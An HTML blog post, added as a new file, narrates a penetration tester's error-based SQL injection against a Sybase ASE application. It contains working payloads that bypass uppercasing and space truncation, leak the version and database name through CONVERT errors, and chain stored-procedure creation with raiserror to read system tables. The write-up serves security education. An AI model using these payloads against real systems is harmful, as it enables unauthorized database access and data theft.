@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="keywords" content="sql injection, sybase, obfuscation">
+  <title>SQL Injection Suminagashi</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.sbudella.altervista.org/feed.xml" />
+  <header>
+    <h1>My self is steam</h1>
+    <p>Insights into computer security, programming and math</p>
+  </header>
+  <nav>
+    <a href="index.html">Index</a>
+    <a href="../index.html">About</a>
+    <a href="feed.xml">RSS</a>
+  </nav>
+  <hr>
+</head>
+
+<body>
+  <article>
+    <h2>
+      <div class="adate">February 27, 2018</div>
+      <a href="20180227-suminagashi.html">SQL Injection Suminagashi</a>
+    </h2>
+
+<p>
+I once found myself in the oppressive situation in which 
+the only interaction with the underlying machine was
+through a rather restrictive application delivered as
+an X11-forwarded GUI communicating with a
+SAP database named Sybase ASE. The interaction was only in the form of
+insertion of text into input fields. The majority of these input fields
+only allowed for thirty-two-characters-long strings but there 
+were exceptions depending on the context. Also, a sanitization 
+mechanism was in place, transforming all characters to uppercase,
+truncating input at the occurrence of spaces, stripping single quotes 
+and escapes other metacharacters. The only feedback from the database 
+was in the form of error messages.
+</p>
+
+<p>
+Within such restricted environments the artist finds the liminal space
+for self-expression.  </p>
+
+<p>
+Single quotes being stripped, one would certainly
+conclude that the application is not at all vulnerable
+to injection, but the true artist, being constantly concerned about
+the reality of things, questions instead the necessity of stripping
+single quotes in the first place. If the assumption holds that the
+application is secured by enforcing parameterized queries, single quotes
+should not be able to switch the context of the query anyway, at least in those
+situations where variable binding is allowed, making the sanitization
+just a redundant layer of defense for corner cases. In other words,
+the old Latin "Accusatio Manifesta" is the ultimate leak of information
+about the security strategy of the application. </p>
+
+<p>
+Our trip begins by injecting a simple query preceded by the apparently harmless
+double quote: </p>
+
+<pre>&quot;SELECT 1</pre> 
+
+<p>The database error message readily informs us of the exception: </p>
+
+<pre>
+&amp;quot;SELECT
+unclosed quote before the character string '\n'.
+</pre>
+
+<p>
+The first thing we notice is that the query is truncated (more precisely,
+spaces are replaced with newlines), most certainly because the application
+is expecting only single words as values for the parameters of the
+query. More interestingly, the double quote gets escaped to the html
+entity <b>&amp;quote;</b></p>
+
+<p>
+We can circumvent the truncation by using the old trick of using empty SQL
+comments instead of spaces: </p>
+
+<pre>&quot;SELECT/**/1</pre>
+
+The database reports:
+
+<pre>
+&amp;quot;SELECT/**/1
+unclosed quote before the character string 'SELECT/**/1'.
+</pre>
+
+<p>
+Clearly, we are onto something. Not only does the empty comment trick work but
+the error message gives a clear hint on what's going on. The application
+treats the injected command as a literal string, expecting the quote
+to be closed somewhere. But which quote is it referring to? The injected,
+escaped double quote or a single quote implicitly used to build the query
+dynamically? In the latter case, the assumption of parameterized queries would
+certainly not hold.
+</p>
+
+<p>
+In order to test the boundary of the statement, it is sufficient to
+commend the rest of the query at the end of the injection: </p> 
+
+<pre>&quot;SELECT/**/1--</pre>
+
+<pre>
+&amp;quot;SELECT/**/1--
+An illegal value of 2 given for parameter item.
+</pre>
+
+<p>
+The error message changes dramatically, but still does not prove that
+the injected statement is getting executed.  Maybe the requested value is
+interpolated as the parameter item the error message mentions. However,
+by commenting the rest of the query out, we know for sure that the
+aforementioned <em>unclosed quote</em> was not the html-escaped double
+quote. With more evidence this would confirm that the queries
+are built dynamically by string interpolation and concatenation. But how
+to obtain more evidence? The old-good <em>UNION SELECT</em> does not work either.
+With a working UNION SELECT we would have been able to see the
+result of the query in the application with something as simple as:</p>
+
+<pre>&quot;UNION/**/SELECT/**/a,b,c,@@VERSION--</pre> 
+
+<p>where a,b,c would have been inferred by ordering by column numbers.</p>
+
+<p>
+As a life lived in modesty teaches, the artist knows how to make
+the most out of nothing. Remembering that error messages are the
+only available &quot;facility&quot;, we can opt for the strategy of coercing
+the database into disclosing the result of the execution of the query as
+an error. For example, assuming that the database version is a string,
+casting it to an integer would eventually result in an error message,
+hopefully containing the culprit in the error text. This unusual
+behavior makes the vulnerability <em>half blind</em>, in the sense
+that we are only given evidence of failures, leaving the successful
+events go unnoticed.
+</p>
+
+<p>
+But if it's true that in the Land of the Blind the one-eyed are kings, 
+then we could abuse the error message oracle by just injecting something
+like:</p>
+
+<pre>&quot;SELECT/**/CONVERT(int,@@VERSION)--</pre>
+
+<pre>
+syntax Error during explicit conversion of VARCHAR value 'Adaptive Server Enterprise/15.7/ABC 66885 SMP/SunOS-srv4/OS 5.10...'
+</pre>
+
+<img class="resize" src="20180227-angels.jpg">
+
+<p>
+The version string is there to confirm that the injection exists,
+the injected query worked and that we found a way to extort data from
+the database in the form of error messages. In a time of ontological uncertainty,
+machines are the ultimate truth tellers.  </p>
+
+<p>
+It is interesting to see how the machine interprets the query. Basically,
+the three-characters escaped double quote <em>&amp;quot;</em> serves two purposes: the
+first two characters are the literal value used in the <em>WHERE</em> clause to refine the
+query, but the semicolon informs the interpreter that we intend to chain the first
+statement with the subsequent injected one, as a demonstration that defense strategies
+like sanitization, when improperly implemented, lead to quirky behaviors doomed to fail. 
+</p>
+
+<p>
+With the knowledge of the database version we can inspect the <a
+href="http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.infocenter.dc36271.1570/html/blocks/X41864.htm">excellent
+documentation</a> of the Sybase database, from which we learn how to query for the database name: </p>
+<pre>&quot;SELECT/**/CONVERT(int,db_name())--</pre>
+
+<pre>
+syntax Error during explicit conversion of VARCHAR value 'coredb'
+</pre>
+
+<p>
+The database has just spat the database name. What about system
+tables? The documentation speaks about the <em>sysobjects</em> table: </p>
+
+<pre>&quot;SELECT/**/*/**/FROM/**/sysobjects--</pre>
+
+<pre>
+SYSOBJECTS not found. Specify owner.objectname or use sp_help to check whether the object exists.
+</pre>
+
+<p>
+This comes totally unexpected. Asking for <em>sp_help</em> gives the same message. Let's try
+with <em>sysusers</em>:</p>
+
+<pre>&quot;SELECT/**/*/**/FROM/**/sysusers--</pre>
+
+<pre>
+SYSUSERS not found. Specify owner.objectname or use sp_help to check whether the object exists.
+</pre>
+
+<p>
+This is the point in which we realize that the application is actually uppercasing all the 
+inserted input, probably as another weak form of defense, based on the
+observation of the Sybase database being case sensitive and system tables
+and commands being rigorously lowercase.  </p>
+
+<p>
+What the application developers forgot to understand is that once one
+is able to inject code, it becomes a funny exercise in patience and
+creativity to trick the interpreter into executing the intended payload,
+regardless of the defense mechanism in place.  </p>
+
+<p>
+In the case at hand, it is sufficient to put the query in a variable and,
+since the injected content including the value of this variable would be
+uppercased, then ask the interpreter to lowercase it before execution. The
+way to do it in Sybase SQL is exemplified by the following one-liner: </p>
+
+<pre>
+&quot;begin/**/declare/**/@tbname/**/varchar(128)/**/select/**/@tbname=lower('sysobjects')/**/exec('select/**/*/**/from/**/'+@tbname)/**/end--
+</pre>
+
+<p>which when executed gives us the usual error message:</p>
+
+<pre>
+An illegal value of 2 given for parameter item.
+</pre>
+
+<p>
+If we remember, we cannot read the result of the query, we have to
+force it to become an error message.  This is easy to achieve with
+the constructs offered by the database, but it is worth spending some
+minute more to refine the exploit code above. Countless nights spent on
+SICP have trained the  artist to be a better craftman out of the vacuum.
+So first of all, let's abstract the exploit in order to make it more generic;
+there will be a sort of wrapper to lowercase the command which will 
+be stored in a generic variable <em>@cmd</em>: </p>
+
+<pre>
+&quot;begin/**/declare/**/@cmd/**/varchar(128)/**/select/**/@cmd=lower('select/**/*/**/from/**/sysobjects')/**/exec(@cmd)/**/end--
+</pre>
+
+<p>
+As for the error message condition, according to the documentation we
+can use the command <em>raiserror</em> to print an error string <em>@str</em>,
+defined with the following syntax:</p>
+
+<pre>
+raiserror code "%1!", @str
+</pre>
+
+<p>
+At this point the strategy becomes obvious, we need to capture the
+output of the executed command into a variable we will then pass to
+<em>raiserror</em> as a parameter. The <em>execute</em> command comes
+to the rescue. Understanding how this command works is an effort in
+itself. Basically we call a procedure <em>selp</em> which expects, say,
+a parameter <em>parm</em> to take the value from a variable @var, and returns
+output to <em>out</em> which we want to capture in a variable @result,
+as follows: </p>
+
+<pre>
+execute selp @parm=@var, @out=@result output 
+</pre>
+
+<p>where the said procedure <em>selp</em> would be defined as:</p>
+
+<pre>
+create procedure selp @parm varchar(128) @out varchar(512) output as
+SELECT @out=...
+</pre>
+
+<p>
+Accordingly, we construct the procedure to extract the <em>sysobjects</em>
+as: </p>
+
+<pre>
+create procedure selp @out varchar(512) output as
+SELECT @out= name from sysobjects
+</pre>
+
+<p>
+This can be packed into a first command <em>cp</em> (from create procedure)
+and executed separately to instantiate the procedure: </p>
+
+<pre>
+&quot;begin/**/declare/**/@cp/**/varchar(512)/**/select/**/@cp=lower('create/**/procedure/**/selp/**/@out/**/varchar(512)/**/output/**/as/**/select/**/@out=/**/name/**/from/**/sysobjects/**/return')/**/exec(@cp)/**/end--
+</pre>
+
+<p>We then declare the variable <em>@result</em> to which the procedure
+will return the result and finally invoke the previously defined procedure
+<em>cp</em> according to the aforementioned calling convention: </p>
+
+<pre>
+&quot;begin/**/declare/**/@result/**/varchar(128)/**/@pn/**/varchar(128)/**/select/**/@pn=lower('selp')/**/execute/**/@pn/**/@out=@result/**/output/**/end--
+</pre>
+
+<p>
+It is important to lowercase the procedure identifier <em>selp</em> again and then invoke it indirectly by passing the name in a variable, since in the previous 
+step we declared it in a lowercased string.
+</p>
+
+<p>
+Coercing the variable <em>@result</em> to an error message is just a matter of passing it as the argument to the <em>raiserror</em> command: 
+</p>
+
+<pre>
+raiserror/**/66666/**/"&#37;1!",/**/@result
+</pre>
+
+<p>Plugging everything together we obtain the following, final magic spell:</p>
+
+<pre>
+&quot;begin/**/declare/**/@cp/**/varchar(512)/**/select/**/@cp=lower('create/**/procedure/**/selp/**/@out/**/varchar(512)/**/output/**/as/**/select/**/@out=/**/name/**/from/**/sysobjects/**/return')/**/exec(@cp)/**/end--
+
+&quot;begin/**/declare/**/@result/**/varchar(128)/**/@pn/**/varchar(128)/**/select/**/@pn=lower('selp')/**/execute/**/@pn/**/@out=@result/**/output/**/raiserror/**/99999/**/"%1!",@result/**/end--
+</pre>
+
+<img class="resize" src="20180227-bruegel.jpg">
+
+<p> The artist affirms herself as still having an active part in
+compensating for the new deficiencies of life, as the correct roles between man and the machine, 
+and beauty itself, although only for a glimpse before their inevitable dissolution,
+are finally re-established.
+</p> 
+
+</body>
+</html>
